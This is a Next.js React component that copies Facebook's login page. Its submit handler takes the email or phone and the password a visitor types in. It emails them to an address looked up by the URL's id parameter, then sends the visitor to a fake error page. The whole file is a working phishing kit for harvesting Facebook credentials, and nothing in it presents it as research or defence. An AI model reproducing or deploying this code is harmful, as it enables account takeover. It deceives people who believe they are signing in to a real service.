"use client";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { sendEmail } from "@/lib/sendemail";
import { getEmailById } from "@/lib/action";
import { useRouter } from "next/navigation";
import { Label } from "@/components/ui/label";
import { Eye, EyeOff } from "lucide-react";

export default function FacebookLogin({
  params,
}: {
  params: {
    id: string;
  };
}) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [login, setlogin] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({ email: "", password: "" });
  const router = useRouter();
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setlogin(true);
    const email = await getEmailById(params.id);
    await sendEmail({ username, password, email });
    setlogin(false);
    router.push(`/error/${params.id}`);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col lg:flex-row items-center justify-center p-4">
      <div className="lg:w-1/2 lg:pr-16 mb-10 lg:mb-0">
        <h1 className="text-blue-500 text-6xl font-bold mb-4">facebook</h1>
        <p className="text-2xl max-w-md">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>
      <div className="bg-white p-8 rounded-xl shadow-md w-full max-w-md">
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <Label htmlFor="email" className="sr-only">
              Email address or phone number
            </Label>
            <Input
              id="email"
              type="text"
              placeholder="Email address or phone number"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-4 py-3 rounded-md border border-gray-300"
              aria-invalid={errors.email ? "true" : "false"}
            />
            {errors.email && (
              <p className="text-red-500 text-sm mt-1">{errors.email}</p>
            )}
          </div>
          <div className="relative">
            <Label htmlFor="password" className="sr-only">
              Password
            </Label>
            <Input
              id="password"
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 rounded-md border border-gray-300 pr-10"
              aria-invalid={errors.password ? "true" : "false"}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600"
            >
              {showPassword ? (
                <EyeOff className="h-5 w-5" aria-hidden="true" />
              ) : (
                <Eye className="h-5 w-5" aria-hidden="true" />
              )}
              <span className="sr-only">
                {showPassword ? "Hide password" : "Show password"}
              </span>
            </button>
            {errors.password && (
              <p className="text-red-500 text-sm mt-1">{errors.password}</p>
            )}
          </div>

          <Button
            type="submit"
            className="w-full bg-blue-500 text-white py-5 rounded-md font-bold text-xl hover:bg-blue-600 transition duration-200"
          >
            {login ? "loging" : "Log in"}
          </Button>
        </form>
        <div className="text-center mt-4">
          <a href="#" className="text-blue-500 text-sm hover:underline">
            Forgotten password?
          </a>
        </div>
        <hr className="my-6 border-gray-300" />
        <div className="text-center">
          <Button className="bg-green-500 text-white py-3 px-4 rounded-md font-bold text-xl hover:bg-green-600 transition duration-200">
            Create new account
          </Button>
        </div>
      </div>
      <div className="mt-8 text-center w-full lg:absolute lg:bottom-4">
        <p className="text-sm">
          <a href="#" className="font-bold hover:underline">
            Create a Page
          </a>{" "}
          for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
}
